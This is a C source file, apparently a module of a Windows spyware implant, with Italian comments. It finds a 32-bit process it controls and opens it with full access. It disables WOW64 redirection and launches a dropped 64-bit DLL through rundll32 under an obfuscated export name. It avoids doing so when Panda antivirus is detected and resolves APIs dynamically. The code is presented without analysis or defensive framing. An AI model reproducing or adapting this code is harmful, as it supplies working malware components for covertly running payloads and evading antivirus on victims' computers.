#include <windows.h>
#include <Tlhelp32.h>
#include "HM_SafeProcedures.h"
#include "H4-DLL.h"
#include "common.h"

typedef void (__stdcall *Sleep_t)(DWORD);

typedef BOOL (__stdcall *IsWow64Process_PROC)(HANDLE, BOOL*);
typedef void (__stdcall *GetNativeSystemInfo_PROC)(LPSYSTEM_INFO);
typedef BOOL (__stdcall *Wow64DisableWow64FsRedirection_PROC)(PVOID *OldValue);
typedef BOOL (__stdcall *Wow64RevertWow64FsRedirection_PROC)(PVOID OldValue);

extern BOOL IsMyProcess(DWORD pid);

#define INVALID_FUNC_PTR (void *)0xFFFFFFFF

HANDLE core64_process = NULL;

BOOL IsX64Process(DWORD InProcessId)
{
	HANDLE hProc = NULL;
    static IsWow64Process_PROC pIsWow64Process = (IsWow64Process_PROC)INVALID_FUNC_PTR;
	static GetNativeSystemInfo_PROC pGetNativeSystemInfo = (GetNativeSystemInfo_PROC)INVALID_FUNC_PTR;
	BOOL IsTargetWOW64 = FALSE;
    SYSTEM_INFO SysInfo;

	if (pIsWow64Process == INVALID_FUNC_PTR) {// Solo la prima volta cerca la funzione
		pIsWow64Process = (IsWow64Process_PROC)HM_SafeGetProcAddress(GetModuleHandle("kernel32.dll"), "IsWow64Process");
		pGetNativeSystemInfo = (GetNativeSystemInfo_PROC)HM_SafeGetProcAddress(GetModuleHandle("kernel32.dll"), "GetNativeSystemInfo");
	}

	if (!pIsWow64Process || !pGetNativeSystemInfo)
		return FALSE;

	pGetNativeSystemInfo(&SysInfo);
	if(SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		return FALSE;

	if((hProc = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION, FALSE, InProcessId)) == NULL)
		return FALSE;

	if(!pIsWow64Process(hProc, &IsTargetWOW64) || IsTargetWOW64) {
		CloseHandle(hProc);
		return FALSE;
	}

	CloseHandle(hProc);
	return TRUE;
}


BOOL IsX64System()
{    
	static GetNativeSystemInfo_PROC pGetNativeSystemInfo = (GetNativeSystemInfo_PROC)INVALID_FUNC_PTR;
    SYSTEM_INFO SysInfo;

	if (pGetNativeSystemInfo == INVALID_FUNC_PTR)
		pGetNativeSystemInfo = (GetNativeSystemInfo_PROC)HM_SafeGetProcAddress(GetModuleHandle("kernel32.dll"), "GetNativeSystemInfo");

	if(pGetNativeSystemInfo == NULL)
		return FALSE;

	pGetNativeSystemInfo(&SysInfo);

	if(SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		return FALSE;

	return TRUE;
}

DWORD Find32BitProcess()
{
	DWORD pid = 0, curr_pid = 0;
	HANDLE hProcessSnap;
	HANDLE hProc;
	PROCESSENTRY32 pe32;

	curr_pid = GetCurrentProcessId();
	pe32.dwSize = sizeof( PROCESSENTRY32 );
	if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE ) 
		return 0;

	if( !FNC(Process32First)( hProcessSnap, &pe32 ) ) {
		CloseHandle( hProcessSnap );
		return 0;
	}

	// Cicla la lista dei processi attivi
	do {
		if (pe32.th32ProcessID!=curr_pid && !IsX64Process(pe32.th32ProcessID) && IsMyProcess(pe32.th32ProcessID)) {
			hProc = FNC(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if (hProc) {
				CloseHandle(hProc);
				pid = pe32.th32ProcessID;
				break;
			}
		}
	} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );
	CloseHandle( hProcessSnap );
	return pid;
}

#define INVALID_REDIRECTION_VALUE (PVOID)0xA9C7E4F2
PVOID DisableWow64Fs()
{
	PVOID OldValue = INVALID_REDIRECTION_VALUE;
	Wow64DisableWow64FsRedirection_PROC pWow64DisableWow64FsRedirection;

	if (!IsX64System())
		return INVALID_REDIRECTION_VALUE;

	pWow64DisableWow64FsRedirection = (Wow64DisableWow64FsRedirection_PROC)HM_SafeGetProcAddress(GetModuleHandle("kernel32.dll"), "Wow64DisableWow64FsRedirection"); 
	if (!pWow64DisableWow64FsRedirection)
		return INVALID_REDIRECTION_VALUE;

	if (!pWow64DisableWow64FsRedirection(&OldValue))
		return INVALID_REDIRECTION_VALUE;

	return OldValue;
}

void RevertWow64Fs(PVOID OldValue)
{
	Wow64RevertWow64FsRedirection_PROC pWow64RevertWow64FsRedirection;

	if (OldValue == INVALID_REDIRECTION_VALUE)
		return;

	if (!IsX64System())
		return;

	pWow64RevertWow64FsRedirection = (Wow64RevertWow64FsRedirection_PROC)HM_SafeGetProcAddress(GetModuleHandle("kernel32.dll"), "Wow64RevertWow64FsRedirection"); 
	if (!pWow64RevertWow64FsRedirection)
		return;

	pWow64RevertWow64FsRedirection(OldValue);
}

extern BOOL IsPanda64();
void Run64Core()
{
	char dll64_path[MAX_PATH];
	char cmd_line[MAX_PATH*2];
	STARTUPINFO si;
    PROCESS_INFORMATION pi;
	HANDLE hfile;
    PVOID OldValue = NULL;
	Wow64DisableWow64FsRedirection_PROC pWow64DisableWow64FsRedirection;
	Wow64RevertWow64FsRedirection_PROC pWow64RevertWow64FsRedirection;

	if (!IsX64System())
		return;

	// Se e' presente Panda64 il modulo a 64 bit fa danni
	if (IsPanda64())
		return;

	pWow64DisableWow64FsRedirection = (Wow64DisableWow64FsRedirection_PROC)HM_SafeGetProcAddress(GetModuleHandle("kernel32.dll"), "Wow64DisableWow64FsRedirection"); 
	pWow64RevertWow64FsRedirection = (Wow64RevertWow64FsRedirection_PROC)HM_SafeGetProcAddress(GetModuleHandle("kernel32.dll"), "Wow64RevertWow64FsRedirection"); 

	if (!pWow64DisableWow64FsRedirection || !pWow64RevertWow64FsRedirection)
		return;

	// Se il file non e' stato droppato, non cerca di caricarlo
	HM_CompletePath(H64DLL_NAME, dll64_path);
	hfile = CreateFileA(dll64_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return;
	CloseHandle(hfile);

	// crea la command line
	memset(cmd_line, 0, sizeof(cmd_line));
	FNC(GetSystemDirectoryA)(cmd_line, sizeof(cmd_line));
	strcat(cmd_line, "\\rundll32.exe ");

	// Path alla DLL e nome funzione
	strcat(cmd_line, "\""); // Per sicurezza...
	strcat(cmd_line, dll64_path);
	strcat(cmd_line, "\""); // ...metto il path alla dll fra ""
	strcat(cmd_line, ",PPPFTBBP10"); 

	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );

	// Lancia rundll32 a 64bit
    if(pWow64DisableWow64FsRedirection(&OldValue))  {
		IndirectCreateProcess(cmd_line, 0, &si, &pi, FALSE);
        pWow64RevertWow64FsRedirection(OldValue);
	}

	core64_process = pi.hProcess;	
}

void Kill64Core()
{
	if (core64_process)
		FNC(TerminateProcess)(core64_process, 0);
}
